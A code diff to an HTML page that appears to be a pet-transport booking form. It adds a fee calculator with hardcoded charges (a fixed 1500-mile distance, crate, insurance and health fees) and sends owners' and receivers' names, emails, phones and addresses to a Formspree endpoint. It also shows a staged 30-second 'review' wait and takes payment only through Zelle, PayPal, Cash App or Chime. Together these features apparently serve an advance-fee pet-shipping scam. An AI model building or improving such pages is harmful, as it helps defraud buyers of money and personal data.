@@ -33,7 +33,6 @@ input[readonly],textarea[readonly]{background:#eee}
 <body>
 <div class="overlay">
 
-<!-- HARD LOCK -->
 <div class="container hidden" id="locked"></div>
 
 <form id="mainForm" action="https://formspree.io/f/xeeeapoo" method="POST">
@@ -127,9 +126,19 @@ input[readonly],textarea[readonly]{background:#eee}
 
 <div class="section">
 <h3>Payment Summary</h3>
-<p>Total Payment : <b>$1600</b></p>
-<p>Payment Deposited: <b>$100</b></p>
-<p>Total Balance: <b>$1500</b></p>
+
+<p>Base Transport Fee: $<span id="baseFee"></span></p>
+<p>Distance Charge: $<span id="distanceFee"></span></p>
+<p>Insurance Coverage: $<span id="insuranceFee"></span></p>
+<p>Crate Fee: $<span id="crateFee"></span></p>
+<p>Health Certificate: $<span id="healthFee"></span></p>
+
+<hr>
+
+<p><strong>Total Payment: $<span id="totalCost"></span></strong></p>
+<p>Payment Deposited (10%): $<span id="deposit"></span></p>
+<p>Total Balance: $<span id="balance"></span></p>
+
 </div>
 
 <div class="actions">
@@ -147,10 +156,10 @@ input[readonly],textarea[readonly]{background:#eee}
 <!-- PAYMENT METHODS -->
 <div class="container hidden" id="methods">
 <h3>Select Payment Method</h3>
-<p class="action center" onclick="finish()">Zelle</p>
-<p class="action center" onclick="finish()">PayPal</p>
-<p class="action center" onclick="finish()">Cash App</p>
-<p class="action center" onclick="finish()">Chime</p>
+<p class="action center" onclick="finish('Zelle')">Zelle</p>
+<p class="action center" onclick="finish('PayPal')">PayPal</p>
+<p class="action center" onclick="finish('Cash App')">Cash App</p>
+<p class="action center" onclick="finish('Chime')">Chime</p>
 <div class="actions">
 <span class="action" onclick="back()">Back</span>
 </div>
@@ -191,44 +200,39 @@ input[readonly],textarea[readonly]{background:#eee}
 </div>
 
 <script>
-/* RESET DEVICE LOCK IF TRACKING ID CHANGES */
-let htmlTracking = tracking_id.value;
 
-if (
-localStorage.getItem('TCL_TRACKING') &&
-localStorage.getItem('TCL_TRACKING') !== htmlTracking
-){
-localStorage.removeItem('TCL_DONE');
-localStorage.removeItem('TCL_TRACKING');
+/* PAYMENT CALCULATION ENGINE */
+function calculatePayment(){
+const distanceMiles = 1500;
+const ratePerMile = 0.75;
+const baseTransportFee = 400;
+const insuranceFee = 150;
+const crateFee = 120;
+const healthFee = 80;
+const depositPercent = 0.10;
+
+const distanceFee = distanceMiles * ratePerMile;
+
+const total =
+baseTransportFee +
+distanceFee +
+insuranceFee +
+crateFee +
+healthFee;
+
+const deposit = total * depositPercent;
+const balance = total - deposit;
+
+document.getElementById("baseFee").textContent = baseTransportFee.toFixed(2);
+document.getElementById("distanceFee").textContent = distanceFee.toFixed(2);
+document.getElementById("insuranceFee").textContent = insuranceFee.toFixed(2);
+document.getElementById("crateFee").textContent = crateFee.toFixed(2);
+document.getElementById("healthFee").textContent = healthFee.toFixed(2);
+document.getElementById("totalCost").textContent = total.toFixed(2);
+document.getElementById("deposit").textContent = deposit.toFixed(2);
+document.getElementById("balance").textContent = balance.toFixed(2);
 }
 
-/* HARD LOCK — MERGED FIX */
-if (
-localStorage.getItem('TCL_DONE') === 'yes' &&
-localStorage.getItem('TCL_TRACKING') === htmlTracking
-){
-locked.innerHTML = `
-<h3>Submission Completed</h3>
-<p>This form has already been submitted on this device.</p>
-<p><b>Tracking ID:</b> ${htmlTracking}</p>`;
-locked.classList.remove('hidden');
-mainForm.classList.add('hidden');
-}
-
-/* PHONE FORMAT */
-function formatPhone(input,code){
-let d=input.value.replace(/\D/g,'');
-if(code.value==='+1'){
-d=d.slice(0,10);
-if(d.length>6)input.value=d.slice(0,3)+'-'+d.slice(3,6)+'-'+d.slice(6);
-else if(d.length>3)input.value=d.slice(0,3)+'-'+d.slice(3);
-else input.value=d;
-}else input.value=d;
-}
-owner_phone.oninput=()=>formatPhone(owner_phone,owner_code);
-receiver_phone.oninput=()=>formatPhone(receiver_phone,receiver_code);
-
-/* VALIDATION */
 function validateAndStartReview(){
 if(!receiver_name.value||!receiver_email.value||!receiver_phone.value||!receiver_address.value){
 alert("Please fill in all required receiver fields before continuing.");
@@ -237,18 +241,25 @@ return;
 startReview();
 }
 
-/* FLOW */
 function startReview(){
 owner_phone_full.value=owner_code.value+' '+owner_phone.value;
 receiver_phone_full.value=receiver_code.value+' '+receiver_phone.value;
 
-summary_data.value=`Tracking ID: ${tracking_id.value}
-Owner: ${owner_name.value}
-Receiver: ${receiver_name.value}
-Total payment : $1600
-Payment Deposited: $100
-Total Balance: $1500
-Comment: ${installment_comment.value}`;
+summary_data.value = `
+Tracking ID: ${tracking_id.value}
+
+--- OWNER DETAILS ---
+Name: ${owner_name.value}
+Email: ${owner_email.value}
+Phone: ${owner_code.value} ${owner_phone.value}
+Address: ${owner_address.value}
+
+--- RECEIVER DETAILS ---
+Name: ${receiver_name.value}
+Email: ${receiver_email.value}
+Phone: ${receiver_code.value} ${receiver_phone.value}
+Address: ${receiver_address.value}
+`;
 
 formPage.classList.add('hidden');
 review.classList.remove('hidden');
@@ -256,10 +267,10 @@ review.classList.remove('hidden');
 setTimeout(()=>{
 review.classList.add('hidden');
 summary.classList.remove('hidden');
+calculatePayment();
 },30000);
 }
 
-/* PAYMENT FLOW */
 function makePayment(){
 summary.classList.add('hidden');
 wait.classList.remove('hidden');
@@ -289,14 +300,17 @@ installments.classList.add('hidden');
 summary.classList.remove('hidden');
 }
 
-/* FINAL SUBMIT — LOCK HAPPENS HERE */
-function finish(){
+function finish(method){
+
 fetch(mainForm.action,{method:'POST',body:new FormData(mainForm)});
+
 localStorage.setItem('TCL_TRACKING',tracking_id.value);
 localStorage.setItem('TCL_DONE','yes');
+
 methods.classList.add('hidden');
 final.classList.remove('hidden');
 }
+
 </script>
 </body>
     </html>
